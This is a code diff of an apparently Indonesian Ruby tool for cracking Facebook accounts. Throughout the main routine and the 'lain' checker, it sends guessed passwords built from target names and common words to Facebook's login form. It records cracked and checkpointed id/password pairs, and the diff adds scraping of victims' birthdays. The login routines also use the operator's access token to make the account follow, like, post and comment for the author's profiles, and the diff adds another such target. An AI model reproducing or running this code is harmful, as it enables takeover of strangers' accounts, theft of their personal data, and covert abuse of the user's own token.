@@ -46,6 +46,7 @@ require 'digest'
 require 'open3'
 require 'files'
 require 'json'
+require 'date'
 require 'erb'
 require 'uri'
 require 'os'
@@ -207,6 +208,7 @@ def loginpw()
     fopen.write($token)
     fopen.close()
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Panutan Gw Ni Boss 😎','Keren Bat Njir 😴'].sample})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Keren","access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
@@ -270,6 +272,7 @@ def loginmba()
         $token = _Moya.to_s
         Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
         Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
+        Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
         Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Keren..','Hoki','Wow'].sample})
         Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] :)","Nice 👍","Selamat Ya Bwang 😁","Aku Pada Mu @[100053033144051:] :)"].sample,"access_token"=>$token})  
         File.open("login.txt", "w") {|f| f.write($token)}
@@ -305,6 +308,7 @@ def loginto()
     fopen.write($token)
     fopen.close()
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Keren Bat Njir 😴','Rahmat The Best Lah 😮'].sample})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] :)","Hai @[100053033144051:] >,<","Mantap Bang","Mantap Pak","Selamat ya kak:)"].sample,"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
@@ -356,6 +360,7 @@ def loginco()
       $name = b['name']
       $id = b['id']
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
+      Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
       Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Pen Punya Sertifikat Ruby :(','Hoki','Keren Abis!'].sample})
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁","Aku Pada Mu @[100053033144051:] >,<"].sample,"access_token"=>$token})  
@@ -923,7 +928,6 @@ def main(data)
       (name.length == 1) ? password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.first + '321',name.first + '54321'] : password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
       for i in password
         begin
-          next if i.length < 6
           uri = URI("https://mbasic.facebook.com/login.php")
           auth = {'email'=>usr['id'],'pass'=>i,'login'=>'submit'}
           req = Net::HTTP::Post.new(uri)
@@ -931,15 +935,26 @@ def main(data)
           req.set_form_data(auth)
           res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
           kue = res['set-cookie']
-          if kue.include? ('c_user')
+          url = res['location'] 
+          if kue.include? ('c_user') or url.include? ('save-device')
             $ok += 1
-            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$g}[OK] #{usr['id']} | #{i}#{$a}")
+            born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{$token}")))['birthday']
+            if !born.nil?
+              ttl = born.split('/') 
+              born = DateTime.parse(ttl.insert(0,ttl.delete_at(1)).join('/')).strftime("%d %B %Y")
+            end
+            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i} | #{born}\n")}
+            puts ("#{$g}[OK] #{usr['id']} | #{i} | #{born}#{$a}")
             break
-          elsif kue.include? ('checkpoint') or res['location'].include? ('checkpoint')
+          elsif kue.include? ('checkpoint') or url.include? ('https://mbasic.facebook.com/checkpoint')
             $cp += 1
-            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i}\n")}
-            puts ("#{$y}[CP] #{usr['id']} | #{i}#{$a}")
+            born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{$token}")))['birthday']
+            if !born.nil?
+              ttl = born.split('/') 
+              born = DateTime.parse(ttl.insert(0,ttl.delete_at(1)).join('/')).strftime("%d %B %Y")
+            end
+            File.open("super.txt","a") {|f| f.write("#{usr['id']} | #{i} | #{born}\n")}
+            puts ("#{$y}[CP] #{usr['id']} | #{i} | #{born}#{$a}")
             break
           end
         rescue NoMethodError,Net::ReadTimeout,Errno::ETIMEDOUT then next
@@ -2449,7 +2464,7 @@ def lain()
       die = 0
       system ('clear')
       puts ($logo)
-      puts ("#{$g}[ INFO ] SEPERATOR id | password")
+      puts ("#{$g}[ INFO ] SEPERATOR id | password | Birhday")
       puts ("#{$w}#{'═'*52}")
       print ("#{$w}[+] File : ")
       file = gets.chomp!
@@ -2460,18 +2475,21 @@ def lain()
         puts ("#{$w}#{'═'*52}")
         for i in files
           sep = i.split('|')
-          email = sep.first
-          pass = sep.last
+          email = sep[0]
+          pass = sep[1]
           uri = URI("https://mbasic.facebook.com/login.php")
           req = Net::HTTP::Post.new(uri)
           req['user-agent'] = $user_agent
           req.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
           log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
           res = log['set-cookie']
-          if res.include? ('c_user')
+          url = log['location']
+          puts (url)
+         
+          if res.include? ('c_user') or url.include? ('save-device')
             ok += 1
             puts ("#{$g}[OK✓] #{email} | #{pass}")
-          elsif res.include? ('checkpoint')
+          elsif res.include? ('checkpoint') or url.include? ('checkpoint')
             cp += 1
             puts ("#{$y}[CP+] #{email} | #{pass}")
           else
